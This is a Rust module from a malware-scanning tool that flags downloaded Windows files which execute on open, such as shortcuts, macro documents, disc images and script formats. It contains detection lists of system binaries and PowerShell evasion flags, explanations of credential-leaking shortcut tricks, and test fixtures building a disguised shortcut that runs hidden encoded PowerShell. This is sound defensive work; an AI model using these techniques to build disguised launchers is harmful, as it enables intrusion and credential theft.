//! Auto-execution surface — files that run something when opened.
//!
//! This module exists because of the project's actual goal, stated by the
//! owner: *don't let files into the system which start executing stuff as soon
//! as it's downloaded.* Every other scanner asks "does this file look
//! malicious?". This one asks a narrower and more answerable question: **what
//! happens if the user double-clicks it?**
//!
//! That reframing matters. Windows has a long list of formats that are not
//! programs, are not detected as programs, and run code anyway:
//!
//! * **`.lnk`** — a shortcut carries an arbitrary command line and any icon it
//!   likes, so it can display as a PDF and run PowerShell. The command line is
//!   in the file and can be read without executing anything.
//! * **Office macros** — `vbaProject.bin` inside an OOXML package. A `.docx`
//!   is *defined* as the macro-free format, so one containing a macro project
//!   is not ambiguous.
//! * **`.hta`, `.scr`, `.pif`, `.wsf`, `.vbe`, `.jse`** — script and program
//!   formats that survive purely because they are not called `.exe`.
//! * **`.iso`, `.img`, `.vhd`** — mounting a disc image is how the Mark of the
//!   Web is stripped, which is why this became the standard delivery container.
//! * **`autorun.inf`** — names a command to run for the volume containing it.
//! * **`.url`, `.website`** — an INI file whose target can be a UNC path,
//!   which fetches and can execute from a remote server, and whose `IconFile`
//!   leaks credentials to whatever host it names.
//!
//! ## What this is not
//!
//! It is not a verdict on maliciousness. A `.ps1` is a perfectly ordinary
//! thing to download if you asked for one. The weights reflect how *unusual*
//! it is to receive the format from the internet, not how dangerous the format
//! is in the abstract — `.exe` is the most dangerous format here and carries
//! one of the lowest weights, because downloading a program is the single most
//! normal reason to download anything.

use crate::scanner::archive;
use crate::scanner::finding::{severity_for, Finding, Severity};
use anyhow::Result;

#[derive(Debug, Default, Clone)]
pub struct AutoExecResult {
    pub flagged: bool,
    pub flags: Vec<String>,
    pub findings: Vec<Finding>,
    pub risk: f32,
    /// True when the format runs code on open without any further step.
    pub executes_on_open: bool,
}

/// Formats that execute, weighted by how odd it is to receive one.
///
/// `(extension, what it is, risk, why it matters)`.
///
/// The ordering here is deliberately not "how much damage could it do". A
/// `.exe` can do anything, and scores 0.2, because asking a browser for a
/// program is the most ordinary transaction on the internet. A `.pif` can do
/// exactly the same things and scores 0.65, because nobody has legitimately
/// sent one since roughly 2001 — its only remaining use is that Windows still
/// honours it and users have never heard of it.
static EXECUTING_FORMATS: &[(&str, &str, f32, &str)] = &[
    // --- Ordinary to download, still worth naming -------------------------
    ("exe", "a program", 0.2,
     "It runs directly when opened. That is expected if you asked for a program."),
    ("msi", "a Windows installer package", 0.2,
     "It installs software, which means it runs with the permissions you grant the installer."),
    ("jar", "a Java application", 0.3,
     "If Java is installed, this runs when double-clicked with no further prompt."),
    ("ps1", "a PowerShell script", 0.3,
     "Windows does not run these on double-click by default, but a single right-click menu \
      entry does, and the script has your full user permissions when it does."),
    ("bat", "a batch file", 0.35,
     "It runs a sequence of commands immediately on double-click, with no prompt at all."),
    ("cmd", "a batch file", 0.35,
     "It runs a sequence of commands immediately on double-click, with no prompt at all."),
    ("reg", "a registry edit", 0.35,
     "Double-clicking applies it to the Windows registry after one confirmation, which can \
      change how the system starts up and what runs with it."),
    ("msc", "a management console file", 0.4,
     "It opens a system administration console, and can be crafted to run a task on load."),

    // --- Rarely legitimate as a download ----------------------------------
    ("scr", "a screensaver", 0.55,
     "A screensaver is an ordinary Windows program with a different extension. It runs exactly \
      like an .exe when double-clicked. There is almost no reason to receive one."),
    ("cpl", "a Control Panel item", 0.55,
     "This is a program that Windows loads and runs through the Control Panel. Receiving one as \
      a download is not a normal thing."),
    ("pif", "a legacy program shortcut", 0.65,
     "Windows still executes these for backwards compatibility with MS-DOS. Nothing has \
      legitimately produced one in decades; the format survives only because it still works."),
    ("hta", "an HTML Application", 0.65,
     "It looks like a web page but runs outside the browser with your full permissions - none of \
      the sandboxing that makes opening a web page safe applies."),
    ("wsf", "a Windows Script Host file", 0.6,
     "Windows runs it immediately on double-click. It can mix scripting languages, which is used \
      to confuse scanners."),
    ("wsh", "a Windows Script Host settings file", 0.5,
     "It controls how scripts execute on this machine."),
    ("vbs", "a Visual Basic script", 0.55,
     "Windows runs it immediately on double-click, with no prompt and your full permissions."),
    ("vbe", "an encoded Visual Basic script", 0.7,
     "It is a script deliberately encoded so its contents cannot be read. Windows decodes and \
      runs it anyway. The encoding has no purpose except to hide what it does."),
    ("js", "a script file", 0.5,
     "Outside a browser, Windows runs a .js file directly with full local permissions - none of \
      the restrictions that apply to scripts on a web page."),
    ("jse", "an encoded script file", 0.7,
     "It is a script deliberately encoded so its contents cannot be read. Windows decodes and \
      runs it anyway."),
    ("scf", "a Windows Explorer command file", 0.6,
     "It runs when the containing folder is merely *viewed*, without being clicked, and can be \
      pointed at a remote server to leak your credentials."),
    ("chm", "a compiled help file", 0.55,
     "Help files can contain and execute scripts. This format is used to deliver payloads \
      because it does not look like a program."),
    ("settingcontent-ms", "a Windows settings shortcut", 0.7,
     "The format contains a `DeepLink` field naming a command, and Windows runs it. It was \
      designed to open a settings page; it will run anything."),
    ("appref-ms", "a ClickOnce application reference", 0.6,
     "It causes Windows to download and run an application from a URL inside the file."),
    ("diagcab", "a troubleshooting package", 0.65,
     "It runs a diagnostic script package with elevated trust and minimal prompting."),
    ("lnk", "a Windows shortcut", 0.6,
     "A shortcut carries a full command line and a chosen icon, so it can look like a document \
      while running anything at all."),
    ("url", "an internet shortcut", 0.45,
     "It names a target to open. If that target is a network path rather than a web page, \
      opening it reaches out to another machine."),
    ("website", "a pinned-site shortcut", 0.45,
     "It names a target to open, in the same way an internet shortcut does."),

    // --- Mount-and-run containers -----------------------------------------
    ("iso", "a disc image", 0.5,
     "Double-clicking mounts it as a drive. Crucially, files opened from a mounted image do NOT \
      carry the Mark of the Web that downloads normally get, so Windows SmartScreen and Office \
      Protected View do not warn about them. That bypass is the reason malware moved to this \
      format."),
    ("img", "a disc image", 0.5,
     "Double-clicking mounts it as a drive, and files inside do not inherit the Mark of the Web \
      that would normally make Windows warn you before running them."),
    ("vhd", "a virtual hard disk", 0.5,
     "Double-clicking mounts it as a drive, and files inside do not inherit the Mark of the Web \
      that would normally make Windows warn you before running them."),
    ("vhdx", "a virtual hard disk", 0.5,
     "Double-clicking mounts it as a drive, and files inside do not inherit the Mark of the Web \
      that would normally make Windows warn you before running them."),
];

/// Windows binaries that malware uses to run its payload, because they are
/// already installed, already signed by Microsoft, and already trusted.
///
/// Finding one of these named in a shortcut's command line is the point: the
/// shortcut is not itself the payload, it is the launcher.
static LOLBINS: &[&str] = &[
    "powershell", "pwsh", "cmd.exe", "mshta", "wscript", "cscript", "rundll32",
    "regsvr32", "certutil", "bitsadmin", "msiexec", "curl", "wmic", "forfiles",
    "installutil", "msbuild", "cmstp", "odbcconf", "conhost", "explorer.exe",
    "schtasks", "reg.exe", "wmiprvse",
];

/// Command-line fragments that indicate deliberate concealment.
static EVASION_MARKERS: &[(&str, &str)] = &[
    ("-enc", "a base64-encoded command, which hides what is actually run"),
    ("-encodedcommand", "a base64-encoded command, which hides what is actually run"),
    ("-e ", "a base64-encoded command, which hides what is actually run"),
    ("frombase64string", "decoding a hidden command at runtime"),
    ("-w hidden", "an instruction to run with no visible window"),
    ("-windowstyle hidden", "an instruction to run with no visible window"),
    ("-nop", "an instruction to skip the user's PowerShell profile and logging"),
    ("-noprofile", "an instruction to skip the user's PowerShell profile and logging"),
    ("-ep bypass", "an instruction to ignore the execution policy that would block scripts"),
    ("-executionpolicy bypass", "an instruction to ignore the execution policy that would block scripts"),
    ("downloadstring", "fetching and running code from a remote server"),
    ("downloadfile", "fetching a file from a remote server"),
    ("invoke-expression", "running text as code"),
    ("iex ", "running text as code"),
    ("webclient", "fetching content from a remote server"),
    ("invoke-webrequest", "fetching content from a remote server"),
    ("start-process", "launching another program"),
    ("javascript:", "running script from a URL"),
    ("vbscript:", "running script from a URL"),
];

fn extension_of(filename: &str) -> String {
    // Not `Path::extension` — `.settingcontent-ms` must survive intact, and
    // the whole point of these formats is the tail of the name.
    filename
        .rsplit_once('.')
        .map(|(_, e)| e.to_lowercase())
        .unwrap_or_default()
}

/// Analyse a complete file for auto-execution behaviour.
pub fn analyse(data: &[u8], filename: &str) -> Result<AutoExecResult> {
    let mut findings: Vec<Finding> = Vec::new();
    let mut risk: f32 = 0.0;
    let mut executes_on_open = false;

    let ext = extension_of(filename);
    let base = filename
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(filename)
        .to_lowercase();

    // --- 1. The format itself runs something -------------------------------
    if let Some((_, what, r, why)) = EXECUTING_FORMATS.iter().find(|(e, ..)| *e == ext) {
        executes_on_open = true;
        findings.push(Finding::new(
            severity_for(*r),
            format!("This file runs when opened - it is {what}"),
            format!("The name ends in .{ext}, which Windows treats as {what}."),
            *why,
            *r,
        ));
        risk = risk.max(*r);
    }

    // --- 2. A shortcut's command line --------------------------------------
    //
    // The strongest check in this module. A `.lnk` is not the payload; it is
    // the instruction, and the instruction is stored in plain text inside the
    // file. Reading it costs nothing and tells us exactly what would run.
    if let Some(link) = parse_lnk(data) {
        for f in link_findings(&link) {
            risk = risk.max(f.risk);
            findings.push(f);
        }
        executes_on_open = true;
    }

    // --- 3. Office macros ---------------------------------------------------
    for f in macro_findings(data, &ext) {
        risk = risk.max(f.risk);
        executes_on_open = true;
        findings.push(f);
    }

    // --- 4. autorun.inf ------------------------------------------------------
    if base == "autorun.inf" {
        let text = String::from_utf8_lossy(&data[..data.len().min(8192)]).to_lowercase();
        let names_command = text.contains("open=") || text.contains("shellexecute=");
        let r = if names_command { 0.7 } else { 0.45 };
        findings.push(Finding::new(
            severity_for(r),
            "This file tells Windows what to run for a whole drive",
            if names_command {
                "An autorun.inf naming a command via `open=` or `shellexecute=`.".to_string()
            } else {
                "An autorun.inf file.".to_string()
            },
            "autorun.inf exists to run a program automatically when a drive is opened. Modern \
             Windows ignores it on USB drives, but still honours it on mounted disc images - \
             which is exactly what the .iso files malware now ships in become when \
             double-clicked.",
            r,
        ));
        risk = risk.max(r);
        executes_on_open = true;
    }

    // --- 5. Internet shortcut targets ---------------------------------------
    if ext == "url" || ext == "website" {
        for f in url_shortcut_findings(data) {
            risk = risk.max(f.risk);
            findings.push(f);
        }
    }

    // --- 6. Executing content inside a container ----------------------------
    //
    // An ISO or a ZIP is only a delivery wrapper; what matters is what comes
    // out of it. `archive.rs` covers ZIP entry names, so this covers the one
    // thing it cannot: an autorun.inf inside the container, which turns a
    // mount into an execution.
    if let Some(entries) = archive::list_entries(data) {
        if let Some(e) = entries
            .iter()
            .find(|e| e.file_name().eq_ignore_ascii_case("autorun.inf"))
        {
            let r = 0.7;
            findings.push(Finding::new(
                Severity::High,
                "Container carries an instruction to run something on open",
                format!("It contains {:?}.", e.name),
                "autorun.inf names a program for Windows to run when the containing volume is \
                 opened. Inside a downloadable container, its only purpose is to turn mounting \
                 the container into running a program.",
                r,
            ));
            risk = risk.max(r);
            executes_on_open = true;
        }
    }

    let risk = risk.min(1.0);
    let flags = findings.iter().map(|f| f.one_line()).collect::<Vec<_>>();
    Ok(AutoExecResult {
        flagged: !findings.is_empty(),
        flags,
        findings,
        risk,
        executes_on_open,
    })
}

// ---------------------------------------------------------------------------
// Windows shell link (.lnk) parsing
// ---------------------------------------------------------------------------

/// The parts of a shortcut worth reporting.
#[derive(Debug, Default, Clone)]
pub struct ShellLink {
    pub relative_path: Option<String>,
    pub working_dir: Option<String>,
    pub arguments: Option<String>,
    pub icon_location: Option<String>,
    /// ShowCommand == SW_SHOWMINNOACTIVE (7) — starts hidden from the user.
    pub starts_hidden: bool,
}

/// `{00021401-0000-0000-C000-000000000046}`, stored little-endian.
const LINK_CLSID: [u8; 16] = [
    0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
];

/// Parse a shell link far enough to read its strings.
///
/// Returns `None` for anything that is not a shortcut. Every length in the
/// format is attacker-controlled, so each one is bounds-checked against the
/// real buffer before use; a malformed shortcut yields `None`, never a panic.
pub fn parse_lnk(data: &[u8]) -> Option<ShellLink> {
    // ShellLinkHeader is exactly 0x4C bytes and says so in its first field.
    if data.len() < 0x4C {
        return None;
    }
    if u32::from_le_bytes([data[0], data[1], data[2], data[3]]) != 0x4C {
        return None;
    }
    if data.get(4..20)? != LINK_CLSID {
        return None;
    }

    let flags = u32::from_le_bytes([data[20], data[21], data[22], data[23]]);
    let show_command = u32::from_le_bytes([data[60], data[61], data[62], data[63]]);

    const HAS_TARGET_IDLIST: u32 = 1 << 0;
    const HAS_LINK_INFO: u32 = 1 << 1;
    const HAS_NAME: u32 = 1 << 2;
    const HAS_RELATIVE_PATH: u32 = 1 << 3;
    const HAS_WORKING_DIR: u32 = 1 << 4;
    const HAS_ARGUMENTS: u32 = 1 << 5;
    const HAS_ICON_LOCATION: u32 = 1 << 6;
    const IS_UNICODE: u32 = 1 << 7;

    let mut off = 0x4Cusize;

    // Optional LinkTargetIDList: a 2-byte size followed by that many bytes.
    if flags & HAS_TARGET_IDLIST != 0 {
        let size = u16::from_le_bytes([*data.get(off)?, *data.get(off + 1)?]) as usize;
        off = off.checked_add(2)?.checked_add(size)?;
    }

    // Optional LinkInfo: a 4-byte size that INCLUDES itself.
    if flags & HAS_LINK_INFO != 0 {
        let size = u32::from_le_bytes([
            *data.get(off)?,
            *data.get(off + 1)?,
            *data.get(off + 2)?,
            *data.get(off + 3)?,
        ]) as usize;
        if size < 4 {
            return None;
        }
        off = off.checked_add(size)?;
    }

    let unicode = flags & IS_UNICODE != 0;
    let read_string = |off: &mut usize| -> Option<String> {
        let count = u16::from_le_bytes([*data.get(*off)?, *data.get(*off + 1)?]) as usize;
        *off += 2;
        // CountCharacters is characters, not bytes — two bytes each in Unicode.
        let byte_len = if unicode { count.checked_mul(2)? } else { count };
        let bytes = data.get(*off..off.checked_add(byte_len)?)?;
        *off += byte_len;
        Some(if unicode {
            let units: Vec<u16> = bytes
                .chunks_exact(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect();
            String::from_utf16_lossy(&units)
        } else {
            String::from_utf8_lossy(bytes).into_owned()
        })
    };

    // StringData appears in this fixed order, each present only if its flag is.
    let mut link = ShellLink {
        starts_hidden: show_command == 7,
        ..Default::default()
    };
    if flags & HAS_NAME != 0 {
        read_string(&mut off)?;
    }
    if flags & HAS_RELATIVE_PATH != 0 {
        link.relative_path = read_string(&mut off);
    }
    if flags & HAS_WORKING_DIR != 0 {
        link.working_dir = read_string(&mut off);
    }
    if flags & HAS_ARGUMENTS != 0 {
        link.arguments = read_string(&mut off);
    }
    if flags & HAS_ICON_LOCATION != 0 {
        link.icon_location = read_string(&mut off);
    }

    Some(link)
}

/// Turn a parsed shortcut into findings.
fn link_findings(link: &ShellLink) -> Vec<Finding> {
    let mut out = Vec::new();

    let args = link.arguments.clone().unwrap_or_default();
    let target = link.relative_path.clone().unwrap_or_default();
    let combined = format!("{target} {args}").to_lowercase();

    if combined.trim().is_empty() {
        return out;
    }

    let lolbin = LOLBINS.iter().find(|b| combined.contains(*b));
    let evasions: Vec<&str> = EVASION_MARKERS
        .iter()
        .filter(|(m, _)| combined.contains(m))
        .map(|(_, why)| *why)
        .collect();

    if let Some(bin) = lolbin {
        // A shortcut to a system interpreter, carrying arguments, is not a
        // shortcut to anything the user has. It is a script with an icon.
        let r: f32 = if evasions.is_empty() { 0.7 } else { 0.9 };
        out.push(Finding::new(
            severity_for(r),
            "Shortcut is set up to run a system command, not open a file",
            format!(
                "Its command line invokes {bin}: {:?}",
                truncate(format!("{target} {args}").trim(), 300)
            ),
            format!(
                "A shortcut normally points at a document or a program you already have. This one \
                 points at a Windows scripting tool and supplies it with instructions{}. The tool \
                 is already installed and already trusted, so nothing warns you when it runs.",
                if evasions.is_empty() {
                    String::new()
                } else {
                    format!(" that include {}", evasions.join(", and "))
                }
            ),
            r,
        ));
    } else if !evasions.is_empty() {
        let r = 0.75;
        out.push(Finding::new(
            Severity::High,
            "Shortcut's command line is written to hide what it does",
            format!("Command line: {:?}", truncate(&combined, 300)),
            format!(
                "It contains {}. Concealment in a command line has no purpose other than \
                 concealment.",
                evasions.join(", and ")
            ),
            r,
        ));
    }

    // A shortcut that starts minimised-and-inactive, carrying a command line,
    // is arranging for the user not to see what happened.
    if link.starts_hidden && !args.trim().is_empty() && lolbin.is_some() {
        out.push(Finding::new(
            Severity::High,
            "Shortcut is set to run without showing a window",
            "Its window mode is 'minimised, not active'.".to_string(),
            "Combined with a command line, this means whatever it runs does so invisibly. You \
             would see nothing happen after double-clicking it.",
            0.6,
        ));
    }

    // The icon is what the user judges the file by, and it is chosen freely.
    if let Some(icon) = &link.icon_location {
        let icon_l = icon.to_lowercase();
        let looks_like_document = ["shell32.dll", "imageres.dll", "wordicon", "acrobat", "excel"]
            .iter()
            .any(|m| icon_l.contains(m));
        if looks_like_document && lolbin.is_some() {
            out.push(Finding::new(
                Severity::High,
                "Shortcut borrows a document icon while running a command",
                format!("Icon source: {:?}", truncate(icon, 200)),
                "The icon is chosen by whoever made the shortcut and has no connection to what it \
                 does. This one is dressed as a document and wired to a system command.",
                0.7,
            ));
        }
    }

    out
}

// ---------------------------------------------------------------------------
// Office macros
// ---------------------------------------------------------------------------

/// OOXML extensions that are *defined* as macro-free.
///
/// This is the crux: the `x` in `.docx` means "no macros". Microsoft split the
/// formats precisely so the extension would answer the question. A `.docx`
/// containing `vbaProject.bin` is therefore not a judgement call — the file
/// contradicts its own format.
static MACRO_FREE_OOXML: &[&str] = &["docx", "xlsx", "pptx", "dotx", "xltx", "potx"];

/// OOXML extensions that legitimately carry macros.
static MACRO_ENABLED_OOXML: &[&str] = &["docm", "xlsm", "pptm", "dotm", "xltm", "potm", "xlam", "ppam"];

fn macro_findings(data: &[u8], ext: &str) -> Vec<Finding> {
    let mut out = Vec::new();

    // --- OOXML: read the ZIP index, no decompression ------------------------
    if let Some(entries) = archive::list_entries(data) {
        let has_vba = entries
            .iter()
            .any(|e| e.file_name().eq_ignore_ascii_case("vbaProject.bin"));

        if has_vba {
            if MACRO_FREE_OOXML.contains(&ext) {
                let r = 0.75;
                out.push(Finding::new(
                    Severity::Critical,
                    "Document contains macros in a format that is not allowed to have them",
                    format!(
                        "The name ends in .{ext}, which is by definition the macro-free variant, \
                         yet the package contains a vbaProject.bin macro project."
                    ),
                    "Microsoft created separate extensions so that .docx/.xlsx/.pptx would mean \
                     'contains no code'. A file breaking that rule was renamed to look safer than \
                     it is, or built to confuse tools that trust the extension.",
                    r,
                ));
            } else if MACRO_ENABLED_OOXML.contains(&ext) {
                let r = 0.45;
                out.push(Finding::new(
                    Severity::Medium,
                    "Document contains macros",
                    "The package contains a vbaProject.bin macro project.".to_string(),
                    "Macros are program code that runs inside Word or Excel. They are a normal \
                     feature and also the most common way malicious documents work, which is why \
                     Office blocks them by default on files from the internet. Enable them only \
                     if you know who sent this and why it needs them.",
                    r,
                ));
            } else {
                // A macro project inside something not claiming to be Office at
                // all — a `.zip`, or a renamed container.
                let r = 0.55;
                out.push(Finding::new(
                    Severity::High,
                    "File contains an Office macro project but is not an Office document",
                    format!("The name ends in .{ext}, yet the contents include vbaProject.bin."),
                    "A macro project outside an Office document is code packaged somewhere it does \
                     not belong.",
                    r,
                ));
            }
        }
    }

    // --- Legacy OLE2 (.doc/.xls/.ppt) ---------------------------------------
    //
    // The old binary formats predate ZIP packaging: they are OLE compound
    // files, where the macro project lives in a stream named in the directory.
    // Parsing OLE properly is a project of its own, but the directory stores
    // stream names as UTF-16LE, so the names themselves are findable directly.
    if data.starts_with(b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1") {
        let has_vba_stream = contains_utf16le(data, "VBA") && contains_utf16le(data, "_VBA_PROJECT");
        if has_vba_stream {
            let r = 0.5;
            out.push(Finding::new(
                Severity::High,
                "Document contains macros",
                "The compound-document directory names a _VBA_PROJECT stream.".to_string(),
                "This is the older Office format, which does not distinguish macro-free files by \
                 extension the way .docx does - so the only way to know is to look inside, which \
                 is what this check does. Macros are code that runs inside Word or Excel.",
                r,
            ));
        }
    }

    out
}

/// Search for an ASCII string encoded as UTF-16LE.
///
/// Bounded to the first 1 MB: OLE directory entries live near the start, and
/// this must not become a linear scan of a large file for every download.
fn contains_utf16le(data: &[u8], needle: &str) -> bool {
    let mut wide = Vec::with_capacity(needle.len() * 2);
    for b in needle.bytes() {
        wide.push(b);
        wide.push(0);
    }
    let window = &data[..data.len().min(1024 * 1024)];
    window.len() >= wide.len() && window.windows(wide.len()).any(|w| w == wide.as_slice())
}

// ---------------------------------------------------------------------------
// Internet shortcuts (.url / .website)
// ---------------------------------------------------------------------------

fn url_shortcut_findings(data: &[u8]) -> Vec<Finding> {
    let mut out = Vec::new();
    let text = String::from_utf8_lossy(&data[..data.len().min(64 * 1024)]);

    for line in text.lines() {
        let line = line.trim();
        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        let key = key.trim().to_lowercase();
        let value = value.trim();
        let value_l = value.to_lowercase();

        // A `URL=` that is not http(s) is not an internet shortcut in any
        // ordinary sense.
        if key == "url" {
            let remote_share = value.starts_with("\\\\") || value_l.starts_with("file://");
            let script_scheme = value_l.starts_with("javascript:")
                || value_l.starts_with("vbscript:")
                || value_l.starts_with("ms-msdt:")
                || value_l.starts_with("search-ms:");

            if script_scheme {
                let r = 0.85;
                out.push(Finding::new(
                    Severity::Critical,
                    "Shortcut opens something that runs code, not a web page",
                    format!("Target: {:?}", truncate(value, 300)),
                    "The target uses a scheme that hands the rest of the line to a program to \
                     execute rather than to a browser to display.",
                    r,
                ));
            } else if remote_share {
                let r = 0.7;
                out.push(Finding::new(
                    Severity::High,
                    "Shortcut points at a file on another machine, not a web page",
                    format!("Target: {:?}", truncate(value, 300)),
                    "Opening it fetches and opens a file from a remote server over Windows file \
                     sharing. That both runs whatever is at the other end and hands your username \
                     and password hash to the machine hosting it.",
                    r,
                ));
            }
        }

        // IconFile pointing at a UNC path leaks credentials with no click at
        // all — Explorer resolves the icon just by showing the file.
        if (key == "iconfile" || key == "workingdirectory") && value.starts_with("\\\\") {
            let r = 0.75;
            out.push(Finding::new(
                Severity::High,
                "Shortcut contacts a remote server just by being displayed",
                format!("{key} points at {:?}", truncate(value, 200)),
                "Windows Explorer resolves this path to draw the icon, before you click anything. \
                 That contact sends your username and an authentication hash to whoever controls \
                 that server. It is a credential theft technique that needs no interaction at all.",
                r,
            ));
        }
    }

    out
}

fn truncate(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        return s.to_string();
    }
    let head: String = s.chars().take(max).collect();
    format!("{head}...")
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- Format-by-extension ------------------------------------------------

    #[test]
    fn ordinary_documents_are_not_flagged() {
        for name in [
            "report.pdf", "photo.jpg", "notes.txt", "data.csv", "song.mp3",
            "archive.tar.gz", "page.html", "styles.css", "readme.md",
        ] {
            let res = analyse(b"arbitrary content here", name).unwrap();
            assert!(!res.flagged, "{name} flagged: {:?}", res.flags);
            assert!(!res.executes_on_open);
        }
    }

    /// Downloading a program is the most ordinary thing there is. `.exe` must
    /// stay well under the sandbox threshold on its own, or every software
    /// download becomes a false positive.
    #[test]
    fn plain_executable_is_reported_but_stays_low() {
        let res = analyse(b"MZ\x90\x00", "setup.exe").unwrap();
        assert!(res.flagged, "an .exe should at least be named");
        assert!(res.executes_on_open);
        assert!(res.risk < 0.4, "plain .exe scored {}", res.risk);
    }

    /// A screensaver is an .exe with a different name and nobody sends them.
    /// The weights are about how unusual the format is, not how much damage it
    /// could do — .scr and .exe can do exactly the same things.
    #[test]
    fn obsolete_execution_formats_outrank_a_plain_executable() {
        let exe = analyse(b"MZ", "a.exe").unwrap().risk;
        for name in ["a.scr", "a.pif", "a.hta", "a.vbe", "a.jse"] {
            let r = analyse(b"x", name).unwrap().risk;
            assert!(r > exe, "{name} ({r}) should outrank .exe ({exe})");
        }
    }

    #[test]
    fn disc_images_are_flagged_and_explain_the_mark_of_the_web() {
        let res = analyse(b"\x00".repeat(100).as_slice(), "invoice.iso").unwrap();
        assert!(res.flagged);
        assert!(
            res.findings.iter().any(|f| f.why.contains("Mark of the Web")),
            "the MOTW bypass is the entire reason this format matters: {:?}",
            res.findings
        );
    }

    #[test]
    fn multi_dot_extensions_are_matched_whole() {
        let res = analyse(b"[x]", "update.settingcontent-ms").unwrap();
        assert!(res.flagged, "compound extension not matched");
        assert!(res.risk >= 0.7);
    }

    // --- Shell links --------------------------------------------------------

    /// Build a .lnk with the given relative path, arguments and icon.
    fn build_lnk(
        relative_path: &str,
        arguments: &str,
        icon: Option<&str>,
        show_command: u32,
    ) -> Vec<u8> {
        let mut d: Vec<u8> = Vec::new();
        d.extend(0x4Cu32.to_le_bytes());
        d.extend(LINK_CLSID);

        let mut flags = (1u32 << 3) | (1 << 5) | (1 << 7); // rel path, args, unicode
        if icon.is_some() {
            flags |= 1 << 6;
        }
        d.extend(flags.to_le_bytes());
        d.extend(0u32.to_le_bytes()); // file attributes
        d.extend([0u8; 24]); // three FILETIMEs
        d.extend(0u32.to_le_bytes()); // file size
        d.extend(0u32.to_le_bytes()); // icon index
        d.extend(show_command.to_le_bytes());
        d.extend(0u16.to_le_bytes()); // hotkey
        d.extend([0u8; 10]); // reserved
        assert_eq!(d.len(), 0x4C, "header must be exactly 0x4C bytes");

        let push_str = |d: &mut Vec<u8>, s: &str| {
            let units: Vec<u16> = s.encode_utf16().collect();
            d.extend((units.len() as u16).to_le_bytes());
            for u in units {
                d.extend(u.to_le_bytes());
            }
        };
        push_str(&mut d, relative_path);
        push_str(&mut d, arguments);
        if let Some(i) = icon {
            push_str(&mut d, i);
        }
        d
    }

    /// The archetype: a shortcut that looks like a document and runs an
    /// encoded PowerShell command.
    #[test]
    fn shortcut_running_encoded_powershell_is_critical() {
        let lnk = build_lnk(
            "..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "-nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
            Some("%SystemRoot%\\System32\\shell32.dll"),
            7,
        );
        let res = analyse(&lnk, "Invoice_2026.pdf.lnk").unwrap();

        assert!(res.flagged);
        assert!(res.risk >= 0.85, "risk was {}", res.risk);
        assert!(
            res.findings
                .iter()
                .any(|f| f.title.contains("run a system command")),
            "{:?}",
            res.findings
        );
        assert!(
            res.findings.iter().any(|f| f.why.contains("base64-encoded")),
            "the concealment should be named: {:?}",
            res.findings
        );
    }

    /// An ordinary shortcut to an application must not be flagged as an
    /// attack, or Aegis blocks every legitimately-shared shortcut.
    #[test]
    fn ordinary_shortcut_is_not_treated_as_an_attack() {
        let lnk = build_lnk("..\\Program Files\\App\\app.exe", "", None, 1);
        let res = analyse(&lnk, "App.lnk").unwrap();

        // The format itself is still reported — a .lnk is worth naming — but
        // nothing should claim it runs a system command.
        assert!(
            !res.findings
                .iter()
                .any(|f| f.title.contains("run a system command")),
            "ordinary shortcut wrongly accused: {:?}",
            res.findings
        );
        assert!(res.risk <= 0.6, "ordinary shortcut scored {}", res.risk);
    }

    #[test]
    fn shortcut_parsing_extracts_the_command_line() {
        let lnk = build_lnk("cmd.exe", "/c calc.exe", None, 1);
        let parsed = parse_lnk(&lnk).expect("valid lnk should parse");
        assert_eq!(parsed.relative_path.as_deref(), Some("cmd.exe"));
        assert_eq!(parsed.arguments.as_deref(), Some("/c calc.exe"));
    }

    #[test]
    fn non_shortcuts_are_not_parsed_as_shortcuts() {
        for data in [
            b"MZ\x90\x00".as_slice(),
            b"\x89PNG\r\n\x1a\n",
            b"",
            &[0u8; 200],
            &[0xFFu8; 200],
        ] {
            assert!(parse_lnk(data).is_none(), "non-shortcut parsed as one");
        }
    }

    /// Every length in a shell link comes from the file.
    #[test]
    fn malformed_shortcuts_never_panic() {
        let full = build_lnk("powershell.exe", "-enc AAAA", Some("shell32.dll"), 7);
        for n in 0..full.len() {
            let _ = parse_lnk(&full[..n]);
            let _ = analyse(&full[..n], "x.lnk").unwrap();
        }
        // Absurd string lengths.
        let mut d = full.clone();
        d[0x4C] = 0xFF;
        d[0x4C + 1] = 0xFF;
        let _ = analyse(&d, "x.lnk").unwrap();

        // Every flag bit set, so the parser is told to read sections that are
        // not there.
        let mut d = full.clone();
        d[20..24].copy_from_slice(&0xFFFF_FFFFu32.to_le_bytes());
        let _ = analyse(&d, "x.lnk").unwrap();
    }

    // --- Office macros ------------------------------------------------------

    /// Build an OOXML-shaped ZIP containing the named entries.
    fn build_ooxml(names: &[&str]) -> Vec<u8> {
        let mut out: Vec<u8> = Vec::new();
        let mut central: Vec<u8> = Vec::new();
        for name in names {
            let local = out.len() as u32;
            let content = b"content";
            out.extend(b"PK\x03\x04");
            out.extend([0u8; 14]);
            out.extend((content.len() as u32).to_le_bytes());
            out.extend((content.len() as u32).to_le_bytes());
            out.extend((name.len() as u16).to_le_bytes());
            out.extend(0u16.to_le_bytes());
            out.extend(name.as_bytes());
            out.extend(content);

            central.extend(b"PK\x01\x02");
            central.extend([0u8; 16]);
            central.extend((content.len() as u32).to_le_bytes());
            central.extend((content.len() as u32).to_le_bytes());
            central.extend((name.len() as u16).to_le_bytes());
            central.extend([0u8; 8]);
            central.extend(0u32.to_le_bytes());
            central.extend(local.to_le_bytes());
            central.extend(name.as_bytes());
        }
        let cd_offset = out.len() as u32;
        let cd_size = central.len() as u32;
        out.extend(&central);
        out.extend(b"PK\x05\x06");
        out.extend([0u8; 4]);
        out.extend((names.len() as u16).to_le_bytes());
        out.extend((names.len() as u16).to_le_bytes());
        out.extend(cd_size.to_le_bytes());
        out.extend(cd_offset.to_le_bytes());
        out.extend(0u16.to_le_bytes());
        out
    }

    #[test]
    fn ordinary_docx_is_not_flagged() {
        let doc = build_ooxml(&[
            "[Content_Types].xml",
            "word/document.xml",
